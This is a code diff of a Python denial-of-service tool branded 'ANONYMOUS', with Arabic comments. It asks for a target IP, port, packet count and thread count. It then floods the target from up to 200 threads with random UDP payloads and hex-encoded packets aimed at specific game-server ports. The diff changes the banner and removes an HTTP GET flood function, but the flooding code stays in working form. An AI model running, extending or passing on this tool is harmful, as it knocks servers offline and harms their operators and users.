@@ -5,36 +5,55 @@ import time
 import socket
 import sys
 import os
-import requests  # مكتبة لعمل الهجوم على المواقع HTTP/HTTPS
 
+# تنظيف الشاشة
 os.system("clear")
-print("""
- ___    _   ______  _   ____  ____  _______  __  _______
-   /   |  / | / / __ \/ | / /\ \/ /  |/  / __ \/ / / / ___/
-  / /| | /  |/ / / / /  |/ /  \  / /|_/ / / / / / / /\__ \
- / ___ |/ /|  / /_/ / /|  /   / / /  / / /_/ / /_/ /___/ /
-/_/  |_/_/ |_/\____/_/ |_/   /_/_/  /_/\____/\____//____/
-""")
 
+# تدرج لوني: بنفسجي إلى سماوي
+gradient_colors = [165, 135, 99, 63, 69, 75, 81, 87, 123, 159, 195]
+
+ascii_art = [
+    "  ___",
+    "   /   |  ____  ____  ____  ____ ___  ______ ___  ____  __  _______",
+    "  / /| | / __ \\/ __ \\/ __ \\/ __ `/ / / / __ `__ \\/ __ \\/ / / / ___/",
+    " / ___ |/ / / / /_/ / / / / /_/ / /_/ / / / / / / /_/ / /_/ (__  )",
+    "/_/  |_|/_/ /_/\\____/_/ /_/\\__,_/\\__, /_/ /_/ /_/\\____/\\__,_/____/",
+    "                               /____/",
+    "   _________",
+    "  / ____/__ \\",
+    " / /    __/ /",
+    "/ /___ / __/",
+    "\\____//____/"
+]
+
+# طباعة الفن بتدرج لوني
+def print_gradient_art(art_lines, colors):
+    for i, line in enumerate(art_lines):
+        color_code = colors[i % len(colors)]
+        print(f"\033[38;5;{color_code}m{line}\033[0m")
+
+print_gradient_art(ascii_art, gradient_colors)
+print()
+
+# إدخال البيانات
 ip = str(input("Target Ip:"))
 port = int(input("Target Port:"))
-website = str(input("Enter Website (http://example.com):"))  # إضافة حقل للموقع
 choice = str(input("Thb Tnik Serveur? (y/n):"))
 times = int(input("Packet:"))
 threads = int(input("Threads:"))
 fake_ip = '182.21.20.32'
 
-# Starting Attacking
-Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
-                       codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
-                       codecs.decode("53414d509538e1a9611e69","hex_codec"),#i
-                       codecs.decode("53414d509538e1a9611e72","hex_codec"),#r
-                       codecs.decode("081e62da","hex_codec"), #cookie port 7796
-                       codecs.decode("081e77da","hex_codec"),#cookie port 7777
-                       codecs.decode("081e4dda","hex_codec"),#cookie port 7771
-                       codecs.decode("021efd40","hex_codec"),#cookie port 7784
-                       codecs.decode("081e7eda","hex_codec")#cookie port 7784 tambem
-                       ]
+Pacotes = [
+    codecs.decode("53414d5090d91d4d611e700a465b00", "hex_codec"),
+    codecs.decode("53414d509538e1a9611e63", "hex_codec"),
+    codecs.decode("53414d509538e1a9611e69", "hex_codec"),
+    codecs.decode("53414d509538e1a9611e72", "hex_codec"),
+    codecs.decode("081e62da", "hex_codec"),
+    codecs.decode("081e77da", "hex_codec"),
+    codecs.decode("081e4dda", "hex_codec"),
+    codecs.decode("021efd40", "hex_codec"),
+    codecs.decode("081e7eda", "hex_codec")
+]
 
 def run():
     data = random._urandom(1460)
@@ -74,7 +93,7 @@ def run3():
             print("[ANONYMOUS] YOUR ATTACK HAS BEEN LAUNCHED!!!")
         except:
             s.close()
-            print("[ANONYMOUS ynikom!")
+            print("[ANONYMOUS] ynikom!")
 
 def run4():
     data = random._urandom(818)
@@ -104,7 +123,6 @@ def run5():
             s.close()
             print("[ANONYMOUS] Anonaymous ynikom!")
 
-# Urandom Dan Pacotes
 class MyThread(threading.Thread):
     def run(self):
         while True:
@@ -120,39 +138,20 @@ class MyThread(threading.Thread):
             elif int(port) == 7784:
                 sock.sendto(Pacotes[7], (ip, int(port)))
 
-# هجوم على الموقع باستخدام HTTP GET requests
-def attack_website():
-    while True:
-        try:
-            response = requests.get(website)
-            print(f"[ANONYMOUS] Attack on {website} has been launched with status code {response.status_code}")
-        except requests.exceptions.RequestException as e:
-            print(f"[ANONYMOUS] Error attacking {website}: {e}")
-
 if __name__ == '__main__':
     try:
-        for x in range(200):                                    
-            mythread = MyThread()  
-            mythread.start()                                  
-            time.sleep(0.1)    
-    except(KeyboardInterrupt):
+        for x in range(200):
+            mythread = MyThread()
+            mythread.start()
+            time.sleep(0.1)
+    except KeyboardInterrupt:
         os.system('cls' if os.name == 'nt' else 'clear')
 
 for y in range(threads):
     if choice == 'y':
-        th = threading.Thread(target=run)
-        th.start()
-        th = threading.Thread(target=run2)
-        th.start()
-        th = threading.Thread(target=run3)
-        th.start()
-        th = threading.Thread(target=run4)
-        th.start()
+        threading.Thread(target=run).start()
+        threading.Thread(target=run2).start()
+        threading.Thread(target=run3).start()
+        threading.Thread(target=run4).start()
     else:
-        th = threading.Thread(target=run5)
-        th.start()
-
-# بدء هجوم على الموقع إذا كان الخيار 'y'
-if choice == 'y':
-    attack_website_thread = threading.Thread(target=attack_website)
-    attack_website_thread.start()
+        threading.Thread(target=run5).start()
